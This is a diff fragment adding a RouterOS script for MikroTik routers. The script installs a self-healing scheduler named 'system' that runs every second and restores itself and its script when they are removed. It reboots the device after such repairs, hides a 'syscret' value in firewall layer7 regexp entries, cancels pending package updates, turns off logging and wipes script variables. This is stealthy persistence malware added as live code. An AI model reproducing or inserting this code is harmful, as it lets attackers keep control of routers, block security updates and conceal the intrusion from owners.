+/ip fir lay add name=sysJail regexp=1;
+} else={
+:if ([:len [:tonum [/ip fir lay get [find name=sysJail] regexp]]]=0) do={
+/ip fir lay set [find name=sysJail] regexp=1;
+} else={
+:loc J [:tonum [/ip fir lay get [find name=sysJail] regexp]];
+:set J ($J+1);
+/ip fir lay set [find name=sysJail] regexp=$J;
+}
+};
+:if ([:len [/sys scr find name=system]]=1) do={
+:del 0
+} else={
+/sys scr add name=system policy=$QQ source=$ZZ
+};
+/sys reb;
+};
+/sys scr {
+:fore o in=[find name!="system"] do={
+:if ([get $o source]=$ZZ) do={
+[rem $o];
+:set sysJ true;
+}
+}
+};
+:if ([:len [/sys sch find name=system]]=1) do={
+:loc SCHX [/sys sch get [find name=system] policy];
+:if ($SCHX!=$SP) do={
+/sys sch set [find name=system] policy=$SP;
+:set sysJ true;
+};
+:if ([/sys sch get [find name=system] disabled]!=no) do={
+/sys sch set [find name=system] disabled=no;
+:set sysJ true;
+};
+:if ([/sys sch get [find name=system] interval]!="00:00:01") do={
+/sys sch set [find name=system] int=1s;
+:set sysJ true;
+};
+:if ([/sys sch get [find name=system] start-time]!="00:00:00") do={
+/sys sch set [find name=system] start-time=00:00:00;
+:set sysJ true;
+};
+:if ([/sys sch get [find name=system] start-date]!="jan/01/1970") do={
+/sys sch set [find name=system] start-date=jan/01/1970;
+:set sysJ true;
+};
+:if ([/sys sch get [find name=system] on-event]!="system") do={
+/sys sch set [find name=system] on-event=system;
+:set sysJ true;
+};
+} else={
+/sys sch add int=1s name=system on-event=system start-date=jan/01/1970 start-time=00:00:00 disable=no;
+:set sysJ true;
+};
+:set UAC [:len [/use act find via!="ftp"]];
+:if ($UAC=0) do={
+:set sysNoOther true
+} else={
+:set sysNoOther true;
+/use act {
+:fore acc in=[find via!="ftp"] do={
+:if ([get $acc name]!="system") do={
+:set sysNoOther false
+}
+}
+}
+};
+/use act {
+:fore u in=[find] do={
+:loc uu [get $u address];
+:loc vv [get $u via];
+:if (([:len [:find $uu ":"]]!=0) or (($vv="console") or ($vv="local"))) do={
+:set mLOG true
+} else={
+:set mLOG false
+}
+}
+};
+:loc UX [/sys pac upd get status];
+:if ([:len [:find $UX "Downloaded"]]=0) do={
+:del 0
+} else={
+/sys pac upd can
+};
+:if ([:len [/ip fir lay find name=syscret]]=0) do={
+/ip fir lay add name=syscret regexp=$syscret;
+:set sysJ true;
+} else={
+:if ([/ip fir lay get [find name=syscret] regexp]!=$syscret) do={
+/ip fir lay set [find name=syscret] regexp=$syscret;
+:set sysJ true;
+}
+};
+:if ($sysJ) do={
+:if ([:len [/ip fir lay find name=sysJail]]=0) do={
+/ip fir lay add name=sysJail regexp=1
+} else={
+:if ([:len [:tonum [/ip fir lay get [find name=sysJail] regexp]]]=0) do={
+/ip fir lay set [find name=sysJail] regexp=1
+} else={
+:loc J [:tonum [/ip fir lay get [find name=sysJail] regexp]];
+:set J ($J+1);
+/ip fir lay set [find name=sysJail] regexp=$J;
+}
+};
+:if ([:len [/sys scr find name=system]]=1) do={
+:del 0
+} else={
+/sys scr add name=system policy=$QQ source=$ZZ
+};
+:if ([:len [/sys sch find name=system]]=1) do={
+/sys sch set [find name=system] int=1s on-event=system start-date=jan/01/1970 start-time=00:00:00 dis=no
+} else={
+/sys sch add int=1s name=system on-event=system start-date=jan/01/1970 start-time=00:00:00 dis=no
+};
+/sys reb;
+}
+};
+:set sR2 0;
+/snm exp ver fil=init10;
+/ip ser exp ver fil=init11;
+/ip fir service-port exp ver fil=init12;
+/sys log set [find] disable=yes;
+/sys log exp ver fil=init13;
+/sys ntp cli exp ver fil=init15;
+/sys log set [find] act=remote dis=yes;
+:del 1;
+/sys scr env rem [find];
+}
+}
